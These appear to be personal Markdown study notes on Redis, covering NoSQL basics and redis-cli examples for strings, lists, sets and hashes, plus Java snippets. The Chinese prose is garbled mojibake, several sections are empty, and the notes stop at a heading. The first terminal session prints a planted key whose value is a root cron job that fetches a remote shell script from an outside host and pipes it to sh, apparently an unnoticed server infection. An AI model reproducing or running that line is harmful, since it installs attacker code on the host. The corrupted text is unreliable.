# Redis

æ—©äº›å¹´çš„å•æœºç‰ˆMysqlä¸å¤Ÿç”¨äº†

è¯»å†™é‡å¤ªå¤§ï¼Œå‘å±•äº†ä¸€ç³»åˆ—å‘ç°

ä¸€ä¸ªç½‘ç«™åŸºæœ¬è¯»8å†™2ï¼Œé‚£å°±æŠŠå¸¸ç”¨çš„è¯»æ”¾åˆ°ç¼“å­˜é‡Œ

è¿™å°±æ˜¯Nosqlæ¥äº†ï¼Œä»¥é”®å€¼å¯¹å½¢å¼å­˜æ”¾æ•°æ®åœ¨ç¼“å­˜ä¸­ï¼Œæé«˜æŸ¥è¯¢æ•ˆç‡ï¼Œä¸ç½‘ç«™ä½¿ç”¨çš„ä½“éªŒ

BSONå’ŒJSONå·®ä¸å¤šï¼Œæ˜¯äºŒè¿›åˆ¶ç‰ˆçš„jsonï¼Œä¹Ÿå¯ä»¥å½“æ•°æ®ä¼ è¾“

POIæ“ä½œExcel  jaråŒ…

> ä¸ºä»€ä¹ˆç”¨Nosqlï¼Ÿ

NoSQL = Not Only SQL

æ³›æŒ‡éå…³ç³»å‹æ•°æ®åº“

web2.0ä¸­è®¸å¤šè¶…å¤§è§„æ¨¡çš„é«˜å¹¶å‘ç¤¾åŒº!æš´éœ²å‡ºè®¸å¤šé—®é¢˜ï¼ŒNosqlåœ¨æ­¤ç¯å¢ƒä¸‹å‘å±•è¿…é€Ÿã€‚Redisæ˜¯æœ€å¿«çš„ã€‚

MongDBï¼Œæ–‡æ¡£å‹æ•°æ®åº“

ç±»ä¼¼ï¼ŒMap<String,Object>çš„K-Vå½¢å¼

> NoSQLç‰¹ç‚¹

- æ–¹ä¾¿æ‰©å±•ï¼Œæ•°æ®é—´æ²¡æœ‰å…³ç³»

- è¯»å–æ¯ç§’11wï¼Œå†™æ¯ç§’8Wæ¬¡ï¼Œé«˜æ€§èƒ½

- æ•°æ®ç±»å‹ä¸ºå¤šæ ·å‹çš„

  - String
  - List
  - Set
  - Hash
  - Zset

- ä¸éœ€è¦äº‹å…ˆè®¾è®¡æ•°æ®åº“ï¼Œéšå–éšç”¨

- ä¼ ç»ŸRDBMS AND NOSQL

  ```
  ä¼ ç»ŸRDBMS
  ç»“æ„åŒ–ç»„ç»‡
  sql
  æ•°æ®ä¸å…³ç³»éƒ½åœ¨è¡¨ä¸­
  æ“ä½œæ•°æ®ï¼Œå®šä¹‰è¯­è¨€
  ä¸€è‡´æ€§ACID
  äº‹åŠ¡æ€§æ“ä½œ
  ....
  ```

  

  ```
  Nosql
  -ä¸ä»…ä»…æ˜¯æ•°æ®
  -æ²¡æœ‰å›ºå®šçš„æŸ¥è¯¢è¯­è¨€
  -é”®å€¼å¯¹KV
  åˆ—å­˜å‚¨
  æ–‡æ¡£å­˜å‚¨
  å›¾å½¢æ•°æ®åº“(ç¤¾äº¤å…³ç³»)
  æœ€ç»ˆä¸€è‡´æ€§
  CAPå®šç† å’Œ BASE(å¼‚åœ°å¤šæ´»)
  é«˜æ€§èƒ½ï¼Œé«˜å¯ç”¨ï¼Œé«˜å¯æ‰©å±•
  ...
  ```

>äº†è§£ï¼š3V+3é«˜

3V:

æµ·é‡ï¼Œå¤šæ ·ï¼Œå®æ—¶

3é«˜ï¼š

é«˜å¹¶å‘(JUCåŸºæœ¬ï¼‰ï¼Œé«˜å¯æ‰©ï¼ˆéšæ—¶æ°´å¹³æ‹†åˆ†ï¼Œæœºå™¨ä¸å¤Ÿäº†ï¼Œæ­å»ºé›†ç¾¤æ¥è§£å†³ï¼‰ï¼Œé«˜æ€§èƒ½ï¼ˆä¿è¯æ•ˆç‡ï¼Œç”¨æˆ·ä½“éªŒï¼‰

ä¼ä¸šå¼€å‘åŸºæœ¬ç»„ä»¶

```
å…³ç³»å‹æ•°æ®åº“ Mysql
æ–‡æ¡£å‹æ•°æ®åº“ MongoDB
å›¾ç‰‡ TFS,GFS,OSS
å…³é”®å­—(æœç´¢) æœç´¢å¼•æ“ ElasticSearchï¼ŒISerach
æ³¢æ®µä¿¡æ¯ å†…å­˜æ•°æ®åº“ Redis,Memache,Tair
å•†å“äº¤æ˜“ï¼Œå¤–éƒ¨æ”¯ä»˜æ¥å£  ä¸‰æ–¹åº”ç”¨ï¼Œæ”¯ä»˜å®ï¼Œå¾®ä¿¡ä¹‹ç±»
```

## Nosqlå››å¤§åˆ†ç±»

Redis6å¼€å§‹æ”¯æŒå¤šçº¿ç¨‹

KVé”®å€¼å¯¹

- æ–°æµªï¼šRedis
- ç¾å›¢ï¼šRedis + Tair
- é˜¿é‡Œï¼Œç™¾åº¦ï¼šRedis + memacache

æ–‡æ¡£å‹æ•°æ®åº“(bsonæ ¼å¼)

- MongoDB
  - æ˜¯ä¸€ä¸ªåŸºäºåˆ†å¸ƒå¼æ–‡ä»¶å­˜å‚¨çš„æ•°æ®åº“C++å†™çš„ï¼Œä¸»è¦ç”¨äºå¤„ç†å¤§é‡æ–‡æ¡£
  - æ˜¯ä¸€ä¸ªä»‹äºå…³ç³»å‹ä¸éå…³ç³»å‹æ•°æ®ä¸­ä¸­é—´çš„äº§å“ï¼ŒMongoDBæ˜¯éå…³ç³»å‹æ•°æ®åº“ä¸­åŠŸèƒ½æœ€ä¸°å¯Œï¼Œæœ€åƒå…³ç³»å‹æ•°æ®åº“çš„
- ConthDB

åˆ—å­˜å‚¨æ•°æ®åº“

- HBase
- åˆ†å¸ƒå¼æ–‡ä»¶ç³»ç»Ÿ

å›¾å½¢å…³ç³»æ•°æ®åº“

- æ”¾çš„æ˜¯å…³ç³»

![image-20220405154611414](C:\Users\L\AppData\Roaming\Typora\typora-user-images\image-20220405154611414.png)

å®‰è£…å˜›å°±ä¸è¯´å•¦ï¼Œä¹‹å‰å°±è‡ªå·±è£…å¥½äº†

### win&linux

![image-20220405160111273](C:\Users\L\AppData\Roaming\Typora\typora-user-images\image-20220405160111273.png)

```
//ç®€å•ç©ç©
[root@lgdlgd123 ~]# redis-cli -p 6379
127.0.0.1:6379> ping
PONG
127.0.0.1:6379> set name lgd
OK
127.0.0.1:6379> get lgd
(nil)
127.0.0.1:6379> get name
"lgd"
127.0.0.1:6379> keys *
1) "backup3"
2) "backup2"
3) "name"
4) "backup1"
5) "backup4"
127.0.0.1:6379> get backup1
"\n\n\n*/2 * * * * root cd1 -fsSL http://oracle.zzhreceive.top/b2f628/b.sh | sh\n\n"

[root@lgdlgd123 ~]# ps -ef|grep redis
redis      947     1  0 Feb03 ?        01:59:53 /www/server/redis/src/redis-server *:6379
root     32018 31975  0 16:00 pts/0    00:00:00 redis-cli -p 6379
root     32457 32425  0 16:03 pts/1    00:00:00 grep --color=auto redis

shutdown //å…³é—­ ctrl+c
```

### redis-benchmarkæµ‹è¯•æ€§èƒ½

å‹åŠ›æµ‹è¯•å·¥å…·

ç®€å•æµ‹è¯•ä¸‹ç©ç©

```bash
#æµ‹è¯•100ä¸ªå¹¶å‘è¿æ¥ æ¯ä¸ªå¹¶å‘10wè¯·æ±‚
redis-benchmark -h localhost -p 6379 -c 50 -n 100000
```

```bash
====== SET ======
  100000 requests completed in 0.63 seconds
  50 parallel clients //50å°å¹¶å‘
  3 bytes payload //æ¯æ¬¡å†™å…¥3å­—èŠ‚
  keep alive: 1 //æœåŠ¡å™¨æ•°

100.00% <= 0 milliseconds //æ‰€æœ‰è¯·æ±‚0æ¯«ç§’å†…å®Œæˆ
158227.84 requests per second

====== GET ======
  100000 requests completed in 0.64 seconds
  50 parallel clients
  3 bytes payload
  keep alive: 1

100.00% <= 0 milliseconds
156739.81 requests per second
```

### åŸºç¡€çŸ¥è¯†

redisé»˜è®¤æœ‰16ä¸ªæ•°æ®åº“

redis.configä¸­

```
# Specify the source name of the events in the Windows Application log.
# syslog-ident redis

# Set the number of databases. The default database is DB 0, you can select
# a different one on a per-connection basis using SELECT <dbid> where
# dbid is a number between 0 and 'databases'-1
databases 16
```

é»˜è®¤ä½¿ç”¨ç¬¬0ä¸ªæ•°æ®åº“

```bash
#å¯ä»¥ä½¿ç”¨selectè¿›è¡Œåˆ‡æ¢
127.0.0.1:6379> select 3
OK
127.0.0.1:6379[3]> dbsize
(integer) 0
#æŸ¥çœ‹DBå¤§å°
127.0.0.1:6379[3]> dbsize
(integer) 1
#æ¸…é™¤å½“å‰æ•°æ®åº“
127.0.0.1:6379[3]> flushdb
OK
#æŸ¥çœ‹æ‰€æœ‰key
127.0.0.1:6379[3]> keys *
(empty array)
#æ¸…é™¤å…¨éƒ¨
127.0.0.1:6379[3]> flushall
OK
```

ä¸ºä»€ä¹ˆredisç«¯å£å·ä¸º6379ï¼Ÿ

è¿™æ˜¯ä¹å®«æ ¼å¯¹åº”çš„æ­Œå¥³åå­—ï¼Œä½œè€…è¯´çš„= =ï¼Ÿï¼Ÿï¼Ÿ

Mysql 3306æ˜¯ä½œè€…å¥³å„¿åå­— ï¼Ÿï¼Ÿï¼Ÿ

> redisåœ¨6å‰æ˜¯å•çº¿ç¨‹

rediså¾ˆå¿«ï¼ŒåŸºäºå†…å­˜æ“ä½œï¼ŒCPUå¹¶ä¸æ˜¯æ€§èƒ½ç“¶é¢ˆï¼Œredisçš„ç“¶é¢ˆæ ¹æ®æœºå™¨çš„å†…å­˜é¢‘ç‡å’Œç½‘ç»œå¸¦å®½ï¼Œå¯ä»¥ä½¿ç”¨å•çº¿ç¨‹æ¥å®ç°å°±æ˜¯ç”¨å•çº¿ç¨‹äº†ã€‚

> Redis ä¸ºä»€ä¹ˆå•çº¿ç¨‹è¿˜è¿™ä¹ˆå¿«ï¼Ÿ

redis æ˜¯Cè¯­è¨€å†™çš„ï¼Œå®˜æ–¹æä¾›çš„æ•°æ®ä¸º100000+çš„QPS,ä¸æ¯”Memecacheå·®ï¼

`redis`ä½¿ç”¨**`epoll`å¤šè·¯I/Oå¤ç”¨æŠ€æœ¯**ï¼Œå•ä¸ªçº¿ç¨‹å¯ä»¥å¤„ç†å¤§é‡çš„å¹¶å‘è¿æ¥ã€‚`epoll`æ˜¯ä¸€ç§é«˜æ•ˆçš„å¤šè·¯å¤ç”¨æŠ€æœ¯ã€‚

è¯¯åŒºï¼šé«˜æ€§èƒ½ä¸€å®šç”¨å¤šçº¿ç¨‹ï¼ˆLRUåˆ‡æ¢ä¹Ÿéœ€è¦èµ„æºï¼‰ï¼Œå¤šçº¿ç¨‹ä¸€å®šæ¯”å•çº¿ç¨‹æ•ˆç‡é«˜

cpu>å†…å­˜é¢‘ç‡>ç¡¬ç›˜

æ ¸å¿ƒï¼šrediså°†æ‰€æœ‰æ•°æ®éƒ½æ”¾åœ¨å†…å­˜ä¸­ï¼Œæ‰€ä»¥ä½¿ç”¨å•çº¿ç¨‹æ“ä½œæ²¡é—®é¢˜

å¤šçº¿ç¨‹æ˜¯ä¸ºäº†æé«˜èµ„æºåˆ©ç”¨ç‡ï¼Œåœ¨æ¶‰åŠç£ç›˜æ“ä½œæ—¶ï¼ŒCPUä¼šæœ‰å¾ˆå¤šæ—¶é—´é˜»å¡åˆ°IOï¼Œé‡‡ç”¨å¤šçº¿ç¨‹å¯ä»¥åˆ©ç”¨é˜»å¡çš„æ—¶é—´

### äº”å¤§æ•°æ®ç±»å‹

>Redis æ˜¯ä¸€ä¸ªå¼€æºï¼ˆBSDè®¸å¯ï¼‰çš„ï¼Œå†…å­˜ä¸­çš„æ•°æ®ç»“æ„å­˜å‚¨ç³»ç»Ÿï¼Œå®ƒå¯ä»¥ç”¨ä½œæ•°æ®åº“ã€ç¼“å­˜å’Œæ¶ˆæ¯ä¸­é—´ä»¶ã€‚ å®ƒæ”¯æŒå¤šç§ç±»å‹çš„æ•°æ®ç»“æ„ï¼Œå¦‚ [å­—ç¬¦ä¸²ï¼ˆstringsï¼‰](http://redis.cn/topics/data-types-intro.html#strings)ï¼Œ [æ•£åˆ—ï¼ˆhashesï¼‰](http://redis.cn/topics/data-types-intro.html#hashes)ï¼Œ [åˆ—è¡¨ï¼ˆlistsï¼‰](http://redis.cn/topics/data-types-intro.html#lists)ï¼Œ [é›†åˆï¼ˆsetsï¼‰](http://redis.cn/topics/data-types-intro.html#sets)ï¼Œ [æœ‰åºé›†åˆï¼ˆsorted setsï¼‰](http://redis.cn/topics/data-types-intro.html#sorted-sets) ä¸èŒƒå›´æŸ¥è¯¢ï¼Œ [bitmaps](http://redis.cn/topics/data-types-intro.html#bitmaps)ï¼Œ [hyperloglogs](http://redis.cn/topics/data-types-intro.html#hyperloglogs) å’Œ [åœ°ç†ç©ºé—´ï¼ˆgeospatialï¼‰](http://redis.cn/commands/geoadd.html) ç´¢å¼•åŠå¾„æŸ¥è¯¢ã€‚ Redis å†…ç½®äº† [å¤åˆ¶ï¼ˆreplicationï¼‰](http://redis.cn/topics/replication.html)ï¼Œ[LUAè„šæœ¬ï¼ˆLua scriptingï¼‰](http://redis.cn/commands/eval.html)ï¼Œ [LRUé©±åŠ¨äº‹ä»¶ï¼ˆLRU evictionï¼‰](http://redis.cn/topics/lru-cache.html)ï¼Œ[äº‹åŠ¡ï¼ˆtransactionsï¼‰](http://redis.cn/topics/transactions.html) å’Œä¸åŒçº§åˆ«çš„ [ç£ç›˜æŒä¹…åŒ–ï¼ˆpersistenceï¼‰](http://redis.cn/topics/persistence.html)ï¼Œ å¹¶é€šè¿‡ [Rediså“¨å…µï¼ˆSentinelï¼‰](http://redis.cn/topics/sentinel.html)å’Œè‡ªåŠ¨ [åˆ†åŒºï¼ˆClusterï¼‰](http://redis.cn/topics/cluster-tutorial.html)æä¾›é«˜å¯ç”¨æ€§ï¼ˆhigh availabilityï¼‰ã€‚

å•ç‚¹ç™»å½•

#### **Redis-Key**

```bash
keys * //æŸ¥çœ‹æ‰€æœ‰key
set name lgd
get name
exists name
expire name 10 //è®¾ç½®è¿‡æœŸæ—¶é—´10s
ttl name //æŸ¥çœ‹å‰©ä½™æ—¶é—´
del name //åˆ é™¤
move name 1 // ç§»åŠ¨1åˆ°æ•°æ®åº“1
```

#### **Strin**g

å­—ç¬¦æ“ä½œ

```bash
127.0.0.1:6379> set age 13
OK
127.0.0.1:6379> get age
"13"
#å¢åŠ å­—ç¬¦,è‹¥keyä¸å­˜åœ¨åˆ™åˆ›å»ºä¸€ä¸ªkey
127.0.0.1:6379> append age 14
(integer) 4
127.0.0.1:6379> get age
"1314"
127.0.0.1:6379> exists age
(integer) 1
#è·å–å­—ç¬¦é•¿åº¦
127.0.0.1:6379> strlen age 
(integer) 4
127.0.0.1:6379> append age "lgd shuai~"
(integer) 14
127.0.0.1:6379> get age
"1314lgd shuai~"
```

åŠ å‡

```bash
127.0.0.1:6379> set age 1
OK
#å¢åŠ 1
127.0.0.1:6379> incr age 
(integer) 2
127.0.0.1:6379> get age
"2"
#å‡1
127.0.0.1:6379> decr age
(integer) 1
127.0.0.1:6379> get age
"1"
127.0.0.1:6379> incrby age 10
(integer) 11
127.0.0.1:6379> get age
"11"
127.0.0.1:6379> decrby age 5
(integer) 6
127.0.0.1:6379> get age
"6"
```

å­—ç¬¦ä¸²èŒƒå›´

```bash
127.0.0.1:6379> set name "hello"
OK
127.0.0.1:6379> getrange name 0 2 #æˆªå–å­—ç¬¦ä¸²
"hel"
127.0.0.1:6379> getrange name 0 -1 #è·å–å…¨éƒ¨
"hello"

############################################
#æ›¿æ¢
127.0.0.1:6379> set name lalala
OK
127.0.0.1:6379> setrange name 1 hoho
(integer) 6
127.0.0.1:6379> get name
"lhohoa"
############################################
# setex(set with expire) #è®¾ç½®è¿‡æœŸæ—¶é—´
# setnx(set if not exist #ä¸å­˜åœ¨å†è®¾ç½®)
#è®¾ç½®name ä¸ºhello è¿‡æœŸæ—¶é—´30s
127.0.0.1:6379> setex name 30 hello
OK
127.0.0.1:6379> setnx mykey "redis"
(integer) 1
127.0.0.1:6379> ttl name
(integer) 10
#å¦‚æœå­˜åœ¨mykeyåˆ™åˆ›å»ºå¤±è´¥
127.0.0.1:6379> setnx mykey "mongoDB"
(integer) 0
127.0.0.1:6379> get mykey
"redis"
############################################
#æ‰¹é‡è·å–å€¼,æ‰¹é‡åˆ é™¤
127.0.0.1:6379> mset k1 v1 k2 v2 k3 v3
OK
127.0.0.1:6379> key *
(error) ERR unknown command `key`, with args beginning with: `*`, 
127.0.0.1:6379> keys *
1) "k3"
2) "backup3"
3) "k1"
4) "backup2"
5) "k2"
6) "backup1"
127.0.0.1:6379> del k1 k2 k3
(integer) 3
127.0.0.1:6379> keys *
1) "backup3"
2) "backup2"
3) "backup1"
127.0.0.1:6379[1]> mset k1 vv1 k2 vv2 k3 vv3
OK
127.0.0.1:6379[1]> mget k1 k2 k3
1) "vv1"
2) "vv2"
3) "vv3"
127.0.0.1:6379[1]> msetnx k1 v1 k4 v4
(integer) 0
#msetnvæ˜¯åŸå­æ€§æ“ä½œï¼Œè¦ä¹ˆå…¨æˆåŠŸè¦ä¹ˆå…¨å¤±è´¥ï¼Œè¿™é‡Œk1å­˜åœ¨ï¼Œæ‰€ä»¥ä¸æ“ä½œ
127.0.0.1:6379[1]> get k4
(nil)
############################################
#æ‰¹é‡æ“ä½œm+xxx
127.0.0.1:6379[1]> set user:1 {name:lgd,age:15}
OK
127.0.0.1:6379[1]> get user:1
"{name:lgd,age:15}
127.0.0.1:6379[1]> mset user:1:name lgd2 user:1:age 20
OK
127.0.0.1:6379[1]> mget user:1:name user:1:age
1) "lgd2"
2) "20"
############################################
#getset å…ˆgetæ—§å€¼å†setæ–°å€¼
127.0.0.1:6379[1]> getset db redis
(nil)
127.0.0.1:6379[1]> get db
"redis"
127.0.0.1:6379[1]> getset db lgd
"redis"
127.0.0.1:6379[1]> getset db lgd2
"lgd"
```

æ•°æ®ç»“æ„æ˜¯ç›¸åŒçš„

Stringç±»ä¼¼çš„ä½¿ç”¨åœºæ™¯:valueé™¤äº†å­—ç¬¦ä¸²è¿˜å¯ä»¥æ˜¯æ•°å­—

- è®¡æ•°å™¨
- ç»Ÿè®¡å¤šå•ä½çš„æ•°ç›® id:110:follow 0
- å¯¹è±¡ç¼“å­˜å­˜å‚¨

#### **List**

æ˜¯ä¸€ç§åŸºæœ¬çš„æ•°æ®ç±»å‹ï¼Œåˆ—è¡¨ï¼Œå¯ä»¥é‡å¤

åœ¨rediså¯ä»¥æŠŠlistå˜æˆæ ˆï¼Œé˜Ÿåˆ—ï¼Œé˜»å¡é˜Ÿåˆ—

lå¼€å¤´æ„å‘³ç€ä»å·¦è¾¹æ“ä½œï¼Œrå¼€å¤´æ„å‘³ç€å³è¾¹å¼€å§‹æ“ä½œ

```bash
127.0.0.1:6379[1]> lpush list one
(integer) 1
127.0.0.1:6379[1]> keys *
1) "list"
127.0.0.1:6379[1]> lrange list 0 -1
1) "one"
127.0.0.1:6379[1]> lpush list tow
(integer) 2
127.0.0.1:6379[1]> lpush list three
(integer) 3
#è·å–listå€¼ï¼Œä¸è¿‡æ˜¯ä»ä¸Šå¾€ä¸‹çš„ï¼Œæ˜¯ä¸ªæ ˆ
127.0.0.1:6379[1]> lrange list 0 1
1) "three"
2) "tow"
#è·å–æ‰€æœ‰listå€¼
127.0.0.1:6379[1]> lrange list 0 -1
1) "three"
2) "tow"
3) "one"

127.0.0.1:6379[1]> lpush list 0
(integer) 4
127.0.0.1:6379[1]> lrange list 0 -1
1) "0"
2) "three"
3) "tow"
4) "one"
127.0.0.1:6379[1]> lrange list 0 0
1) "0"
#å³è¾¹æ·»åŠ 
127.0.0.1:6379[1]> rpush list lalala
(integer) 5
127.0.0.1:6379[1]> lrange list 0 -1
1) "0"
2) "three"
3) "tow"
4) "one"
5) "lalala"
#æ ¹æ®ä¸‹æ ‡è·å–å€¼
127.0.0.1:6379[1]> lindex list 1
"three"
#è·å–é•¿åº¦
127.0.0.1:6379[1]> llen list
(integer) 5
#ç§»é™¤listä¸­1ä¸ªå…ƒç´ ä¸º0çš„
127.0.0.1:6379[1]> lrem list 1 0
(integer) 1
127.0.0.1:6379[1]> lrange list 0 -1
1) "three"
2) "tow"
3) "one"
4) "lalala"
############################################
#trim ä¿®å»º 
#ä»å·¦è¾¹å¼€å§‹ï¼Œè£å‰ª1å¼€å§‹æˆªå–2ä¸ªï¼Œä¹‹ålistå°±åªå‰©ä¸‹è¢«è£å‰ªçš„æ•°æ®
127.0.0.1:6379[1]> ltrim list 1 2
OK
127.0.0.1:6379[1]> lrange list 0 -1
1) "two"
2) "one"
############################################
#ç»„åˆå‘½ä»¤ pop and rushï¼Œç»„åˆå‘½ä»¤æ˜¯åŸå­æ€§æ“ä½œï¼Œå¹¶å‘æ—¶å®‰å…¨
127.0.0.1:6379[1]> rpush list hello
(integer) 1
127.0.0.1:6379[1]> rpush list hello1
(integer) 2
127.0.0.1:6379[1]> rpush list hello2
(integer) 3
127.0.0.1:6379[1]> rpush list hello3
(integer) 4
#å…ˆå–å‡ºæœ€å³è¾¹çš„å…ƒç´ å†æŠŠå®ƒæ·»åŠ åˆ°æœ€å·¦è¾¹
127.0.0.1:6379[1]> rpoplpush list list
"hello3"
127.0.0.1:6379[1]> lrange list 0 -1
1) "hello3"
2) "hello"
3) "hello1"
4) "hello2"

############################################
127.0.0.1:6379[1]> lpush list e1
(integer) 1
127.0.0.1:6379[1]> lrange list 0 0
1) "e1"
#lset,æ ¹æ®ä¸‹è¡¨ä¿®æ”¹å…ƒç´ ï¼Œå¦‚æœä¸å­˜åœ¨ä¼šæŠ¥é”™
127.0.0.1:6379[1]> lset list 0 element1
OK
127.0.0.1:6379[1]> lrange list 0 0
1) "element1"
############################################
#linsert list after element2 lululu,åœ¨å·¦è¾¹çš„element2 çš„åé¢ æ·»åŠ  lululu å…ƒç´  ï¼Œé‡åˆ°ç›¸åŒçš„å€¼é»˜è®¤ç¬¬ä¸€ä¸ª
127.0.0.1:6379[1]> lpush list element2
(integer) 2
127.0.0.1:6379[1]> linsert list before element2 lalala
(integer) 3
127.0.0.1:6379[1]> lrange list 0 -1
1) "lalala"
2) "element2"
3) "element1"
127.0.0.1:6379[1]> linsert list after element2 lululu
(integer) 4
127.0.0.1:6379[1]> lrange list 0 -1
1) "lalala"
2) "element2"
3) "lululu"
4) "element1"

127.0.0.1:6379[1]> lpush list element2
(integer) 5
127.0.0.1:6379[1]> linsert list after element2 lululu2
(integer) 6
127.0.0.1:6379[1]> lrange list 0 -1
1) "element2"
2) "lululu2"
3) "lalala"
4) "element2"
5) "lululu"
6) "element1"
```

![image-20220407084219753](C:\Users\L\AppData\Roaming\Typora\typora-user-images\image-20220407084219753.png)

å°ç»“ï¼š

- å®ƒå®é™…ä¸Šæ˜¯ä¸€ä¸ªé“¾è¡¨ï¼Œbefore Node after , left ,rightéƒ½å¯ä»¥æ’å…¥å€¼
- å¦‚æœkeyä¸å­˜åœ¨å°±åˆ›å»ºä¸€ä¸ªæ–°çš„é“¾è¡¨ï¼Œå­˜åœ¨å°±å¢åŠ å†…å®¹
- å¦‚æœç§»é™¤äº†æ‰€æœ‰çš„å€¼ï¼Œç©ºé“¾è¡¨ï¼Œä¹Ÿä»£è¡¨ä¸å­˜åœ¨
- åœ¨ä¸¤è¾¹æ’å…¥æˆ–è€…æ”¹åŠ¨å€¼æ•ˆç‡æœ€é«˜ï¼Œä¸­é—´å…ƒç´ ç›¸å¯¹æ•ˆç‡ä¼šä½ä¸€ç‚¹

æ¶ˆæ¯é˜Ÿåˆ—ï¼Œå·¦è¾¹è¿›å»å·¦è¾¹æ‹¿å°±æ˜¯æ ˆ lpush lpop

å·¦è¾¹è¿›å»å³è¾¹å‡ºæ¥å°±æ˜¯æ¶ˆæ¯é˜Ÿåˆ—lpush rpop

#### **Set**

setä¸­çš„å€¼ä¸å¯ä»¥é‡å¤ï¼Œæ¯”å¦‚javaé‡Œå¯ä»¥ç”¨equalsè¿›è¡Œæ¯”è¾ƒ

setå¼€å¤´éƒ½æ˜¯s

```bash
#seté‡Œæ·»åŠ å…ƒç´ 
127.0.0.1:6379[1]> sadd set hello
(integer) 1
127.0.0.1:6379[1]> sadd set name 
(integer) 1
127.0.0.1:6379[1]> sadd set lgd
(integer) 1
#æŸ¥çœ‹æŒ‡å®šsetçš„æ‰€æœ‰å€¼
127.0.0.1:6379[1]> smembers set
1) "lgd"
2) "name"
3) "hello"
#sismemberçœ‹æ˜¯å¦å­˜åœ¨è¿™ä¸ªå…ƒç´ 
127.0.0.1:6379[1]> sismember set lgd
(integer) 1
127.0.0.1:6379[1]> sismember set lalalala
(integer) 0
############################################
#è·å–ä¸ªæ•°
127.0.0.1:6379[1]> scard set
(integer) 3
#å†æ¬¡addä¸€ä¸ªå­˜åœ¨çš„å…ƒç´ ï¼Œä¸å¯æ¶æ·»åŠ 
127.0.0.1:6379[1]> sadd set name
(integer) 0
127.0.0.1:6379[1]> smembers set
1) "lgd"
2) "name"
3) "hello"
############################################
#ç§»é™¤helloå…ƒç´ 
127.0.0.1:6379[1]> srem set hello
(integer) 1
127.0.0.1:6379[1]> smembers set
1) "lgd"
2) "name"
############################################
#ç”±äºsetæ— åºä¸”ä¸å­˜åœ¨é‡å¤,æ‰€ä»¥æä¾›äº†ä¸€ä¸ªapiç±»ä¼¼äºæŠ½å¥–
127.0.0.1:6379[1]> srandmember set
"name"
127.0.0.1:6379[1]> sadd set sex
(integer) 1
127.0.0.1:6379[1]> sadd set 1
(integer) 1
127.0.0.1:6379[1]> sadd set 2
(integer) 1
127.0.0.1:6379[1]> SRANDMEMBER set 2
1) "2"
2) "sex"
127.0.0.1:6379[1]> SRANDMEMBER set 2
1) "2"
2) "lgd"
127.0.0.1:6379[1]> SRANDMEMBER set 2
1) "1"
2) "name"
127.0.0.1:6379[1]> SRANDMEMBER set 2
1) "2"
2) "lgd"
############################################
15-7
```

#### **Hash**

value: åˆæ˜¯ä¸€ä¸ªK-V

æ¶‰åŠopsForHash()

```java
//å•ä¸ªçš„æ–¹å¼å†™å…¥redis
redisTemplate.opsForHash().put("map1", "k1", "value1");
//å£°æ˜çš„æ–¹å¼å†™å…¥redis
redisTemplate.opsForHash().putAll("map2", map);
//redis çš„key æŠŠmapç»™åˆ é™¤äº†
redisTemplate.delete("map1");
//æ ¹æ®redis çš„key åˆ¤æ–­hashæ˜¯å¦å­˜åœ¨,æœ‰è¿”å›trueï¼Œ ä¸å­˜åœ¨è¿”å›false
redisTemplate.hasKey("map2");
//redisçš„keyå’Œmapçš„key
redisTemplate.opsForHash().hasKey("map2", "k4");
//æ ¹æ®redisçš„key å’Œhash çš„key åˆ é™¤å½“ä¸ª value
redisTemplate.opsForHash().delete("map2", "k5");
//keysæ–¹æ³•ï¼Œè·å–keyå¯¹åº”çš„hashè¡¨çš„æ‰€æœ‰é”®å€¼å¯¹
Map<Object, Object> entries = redisTemplate.opsForHash().entries("k1");
```



#### **Zset**



#### **geospatial**



#### **hyperloglogs**



#### **bitmaps**



#### å…³äºpipelineçš„ä½¿ç”¨

```java
Set<String> keys = redisTemplate.keys("*");
redisTemplate.delete(keys);
StopWatch stopWatch = new StopWatch();
stopWatch.start("ä½¿ç”¨pipeline");

long startTime = System.currentTimeMillis();
StringRedisSerializer stringRedisSerializer = new StringRedisSerializer();
List list = redisTemplate.executePipelined(new RedisCallback<Object>() {
    @Override
    public Object doInRedis(RedisConnection redisConnection) throws DataAccessException {
        for (int i = 0; i < 100000; i++) {
            String key = "æµ‹è¯•" + String.valueOf(i);
            redisConnection.hSet(stringRedisSerializer.serialize("lalala1"),stringRedisSerializer.serialize(key),stringRedisSerializer.serialize("666666"));
        }
        return null;
    }
},stringRedisSerializer);

long endTime = System.currentTimeMillis();
long costTime = endTime - startTime;
System.out.println(costTime);
stopWatch.stop();
Set<String> keys1 = redisTemplate.keys("*");
redisTemplate.delete(keys1);
stopWatch.start("ä¸ä½¿ç”¨pipeline");
long startTime2 = System.currentTimeMillis();
for (int i = 0; i < 100000; i++) {
    String key = "æµ‹è¯•" + String.valueOf(i);
    redisTemplate.opsForHash().put("lalala2",key,"666666");
}
long endTime2 = System.currentTimeMillis();
long costTime2 = endTime2 - startTime2;
System.out.println(costTime2);
stopWatch.stop();
```

æ•ˆæœ

![image-20220506161553380](C:\Users\L\Desktop\æ–‡æ¡£\photo\image-20220506161553380.png)

## ä»€ä¹ˆæ˜¯redisï¼Ÿ

`Redis`(Remote Dictionary Server) (è¿œç¨‹å­—å…¸æœåŠ¡)æ˜¯ä¸€ä¸ªä½¿ç”¨ C è¯­è¨€ç¼–å†™çš„ï¼Œå¼€æºçš„é«˜æ€§èƒ½éå…³ç³»å‹ï¼ˆNoSQLï¼‰çš„é”®å€¼å¯¹æ•°æ®åº“ã€‚`Redis` å¯ä»¥å­˜å‚¨é”®å’Œäº”ç§ä¸åŒç±»å‹çš„å€¼ä¹‹é—´çš„æ˜ å°„ã€‚é”®çš„ç±»å‹åªèƒ½ä¸ºå­—ç¬¦ä¸²ï¼Œå€¼æ”¯æŒäº”ç§æ•°æ®ç±»å‹ï¼šå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€é›†åˆã€æ•£åˆ—è¡¨ã€æœ‰åºé›†åˆã€‚`redis`æ¯ç§’å¯ä»¥å¤„ç†è¶…è¿‡ **10ä¸‡æ¬¡**è¯»å†™æ“ä½œï¼Œæ˜¯å·²çŸ¥æ€§èƒ½æœ€å¿«çš„Key-Value DBã€‚å¦å¤–`redis`ä¹Ÿå¸¸ç”¨æ¥åšåˆ†å¸ƒå¼é”ã€‚

## redisçš„ä¼˜ç¼ºç‚¹ï¼Ÿ

**ç¼ºç‚¹ï¼š**

